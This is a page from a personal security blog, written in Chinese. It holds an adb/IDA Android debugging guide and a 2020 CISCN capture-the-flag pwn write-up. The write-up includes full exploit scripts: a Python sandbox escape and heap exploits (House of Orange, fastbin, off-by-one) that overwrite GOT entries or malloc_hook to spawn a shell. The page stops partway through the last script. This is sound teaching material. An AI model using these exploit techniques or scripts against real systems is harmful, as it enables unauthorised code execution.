<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>I0gan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:type" content="website">
<meta property="og:title" content="I0gan">
<meta property="og:url" content="http://blog.i0gan.cn/page/4/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="Even if a man has reached the top, he still needs to improve himself">
<meta property="og:locale">
<meta property="article:author" content="i0gan">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">I0gan</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-android-debuger" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/06/android-debuger/" class="article-date">
  <time datetime="2020-09-06T05:47:24.000Z" itemprop="datePublished">2020-09-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/reverse/">reverse</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/06/android-debuger/">调试安卓程序</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="IDA-调试安卓"><a href="#IDA-调试安卓" class="headerlink" title="IDA 调试安卓"></a>IDA 调试安卓</h1><p>工具:</p>
<p>Nox</p>
<p>IDA</p>
<h2 id="进入Nox-bin目录"><a href="#进入Nox-bin目录" class="headerlink" title="进入Nox\bin目录"></a>进入Nox\bin目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Program Files (x86)\Nox\bin</span><br></pre></td></tr></table></figure>

<h2 id="adb连接模拟器"><a href="#adb连接模拟器" class="headerlink" title="adb连接模拟器"></a>adb连接模拟器</h2><p>nox_adb.exe connect 127.0.0.1:62001</p>
<h2 id="上传ida-监听文件"><a href="#上传ida-监听文件" class="headerlink" title="上传ida 监听文件"></a>上传ida 监听文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push &#39;C:\Users\b\Desktop\down\IDA_Pro_v7.0_Portable\dbgsrv&#x2F;android_server &#39; &#x2F;data&#x2F;local&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="运行ida监听文件"><a href="#运行ida监听文件" class="headerlink" title="运行ida监听文件"></a>运行ida监听文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;</span><br><span class="line">chmod +x android_server</span><br><span class="line">.&#x2F;android_server </span><br></pre></td></tr></table></figure>

<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>

<h2 id="启动所要调试的程序"><a href="#启动所要调试的程序" class="headerlink" title="启动所要调试的程序"></a>启动所要调试的程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.qipeimall&#x2F;com.qipeimall.MainActivity</span><br></pre></td></tr></table></figure>

<h2 id="IDA连接"><a href="#IDA连接" class="headerlink" title="IDA连接"></a>IDA连接</h2><p>Debugger-&gt;Attach-&gt;..</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/06/android-debuger/" data-id="ckhemv7zd0003wdcm6st5139r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/" rel="tag">android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-2020-ciscn" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/02/wp-2020-ciscn/" class="article-date">
  <time datetime="2020-09-02T10:01:35.000Z" itemprop="datePublished">2020-09-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/02/wp-2020-ciscn/">wp 2020国赛</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="2020-CISCN-PWN-WP"><a href="#2020-CISCN-PWN-WP" class="headerlink" title="2020 CISCN PWN WP"></a>2020 CISCN PWN WP</h1><p>当时只做了一道easybox, 但远程打不通, 菜….</p>
<p>原题下载: <a target="_blank" rel="noopener" href="https://github.com/I0gan/pwn/tree/master/matchs/2020_08_ciscn">https://github.com/I0gan/pwn/tree/master/matchs/2020_08_ciscn</a></p>
<h2 id="1-babyjsc"><a href="#1-babyjsc" class="headerlink" title="1-babyjsc"></a>1-babyjsc</h2><h3 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h3><p>1 / 10</p>
<h3 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h3><p>使用Python模拟的终端, 先输入大小, 然后jsc数据执行jsc数据.</p>
<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><p>使用python 模拟的终端</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>python sanbox escape</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>python 沙箱逃逸</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; remote(&#39;0.0.0.0&#39;, 0)</span><br><span class="line">p &#x3D; &quot;__import__(&#39;os&#39;).system(&#39;sh&#39;)&quot;</span><br><span class="line">sh.sendline(len(p))</span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="2-NoFree"><a href="#2-NoFree" class="headerlink" title="2-NoFree"></a>2-NoFree</h2><h3 id="难度-1"><a href="#难度-1" class="headerlink" title="难度"></a>难度</h3><p>5 / 10</p>
<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="简单描述-1"><a href="#简单描述-1" class="headerlink" title="简单描述"></a>简单描述</h3><p>只有添加和编辑</p>
<h3 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_40095C</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(p_addr, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>, <span class="number">0L</span>L);</span><br><span class="line">  read_n(p_addr, size);</span><br><span class="line">  <span class="keyword">return</span> strdup(p_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>strdup函数相当于包含了strlen + malloc + strcpy 函数, 根据字符串长度来malloc, 然后strcpy到开辟的空间里,然后在输入一定大小后, 再输入内容,内容中若出现’\x00’字符截断, 则造成在edit模式堆溢出, 可以在同个index下开辟内存, 造成内存泄漏.</p>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>House of Orange, fastbin attack</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>通过堆溢出漏洞修改top chunk 大小, 不断开辟内存, 直到开辟top chunk 快完毕, 使剩余的top chunk 为 fastbin size, 再开辟一块大的, 使剩余的部分为fastbin, 然后通过堆溢出修改fastbin fd为 p_addr + 0x100(堆指针数组), 在该数组中的大小要与fastbin 中的一致, 通过fastbin attack 打入 p_addr+ 0x100,  通过index 0控制 index 1 打入p_addr 设置字符串漏洞, 然后修改 memset 的got 表为printf的plt地址,再次开辟泄漏libc.再使用同样的方法修改atoi got表中的地址为system, 传入 ‘/bin/sh’即可 get shell</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	md(<span class="number">0</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfe1</span>))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">		ad(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;A&#x27;</span> *<span class="number">0x90</span>)</span><br><span class="line">	</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x70</span>)</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span>) <span class="comment"># idx 0</span></span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span>) <span class="comment"># make it as 0x21 fastbin</span></span><br><span class="line">	p_addr = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line">	md(<span class="number">0</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x20</span>) + p64(p_addr + <span class="number">0x100</span>))</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># Make the fastbin size as 0x20 for fastbin attaking</span></span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x20</span>, p64(exe.got[<span class="string">&#x27;memset&#x27;</span>]) + p64(<span class="number">0x10</span>)) <span class="comment"># modify memset got table as printf</span></span><br><span class="line">	md(<span class="number">1</span>, p64(exe.plt[<span class="string">&#x27;printf&#x27;</span>])) </span><br><span class="line"></span><br><span class="line">	md(<span class="number">0</span>, p64(p_addr))</span><br><span class="line">	md(<span class="number">1</span>,<span class="string">&#x27;%17$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Add one to call print leak libc</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	libc_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;content&#x27;</span>), <span class="number">16</span>) - (<span class="number">0x7ffff7a2d830</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">	libc_sys = libc_base + lib.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Modify atoi got tabel as system, then send /bin/sh to get shell</span></span><br><span class="line">	md(<span class="number">0</span>, p64(exe.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">	md(<span class="number">1</span>, p64(libc_sys))</span><br><span class="line">	sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="3-Easy-box"><a href="#3-Easy-box" class="headerlink" title="3-Easy box"></a>3-Easy box</h2><h3 id="难度-2"><a href="#难度-2" class="headerlink" title="难度"></a>难度</h3><p>4 / 10</p>
<h3 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h3 id="简单描述-2"><a href="#简单描述-2" class="headerlink" title="简单描述"></a>简单描述</h3><p>只存在添加和删除功能</p>
<h3 id="vul-2"><a href="#vul-2" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">qword_202040[v1] = size + <span class="number">1</span>;                  <span class="comment">// vul off by one</span></span><br><span class="line">qword_2020C0[v1] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, qword_2020C0[v1], qword_202040[v1]);</span><br></pre></td></tr></table></figure>

<p>存在off by one漏洞</p>
<h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><p>io-file, fastbin attack</p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>堆布局构成fastbin 打入 <code>_IO_2_1_stderr + 192</code>处, 泄漏libc, 再次使用用fastbin 打入 malloc_hook - 0x23处修改malloc_hook, realloc调整execve参数</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">exeFile = <span class="string">&#x27;easy_box&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;101.200.53.148&quot;</span></span><br><span class="line">remotePort = <span class="number">34521</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">index, size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(index));</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0x68</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">	ad(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span 